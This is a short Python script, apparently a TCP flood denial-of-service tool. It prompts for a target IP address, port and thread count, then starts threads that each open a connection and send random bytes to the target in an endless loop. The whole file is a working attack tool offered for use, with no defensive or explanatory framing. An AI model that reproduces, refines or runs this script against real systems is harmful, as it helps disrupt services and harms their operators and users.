import socket
import threading
import random

ip = input("[+] Enter IP Address:")
port = input("[+] Enter Port:")
thereads = int(input("[+] Enter Threads:"))

def TCP_L7():
    data = random._urandom(random.randint(1, 99999))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    s.send(data)

    while True:
        try:
            s.send(data)
            print("[+] Sending TCP Packets")
        except:
            print("[-] Error Sending TCP Packets")
            break
    s.close()
    
for i in range(thereads):
    t = threading.Thread(target=TCP_L7)
    t.start()
    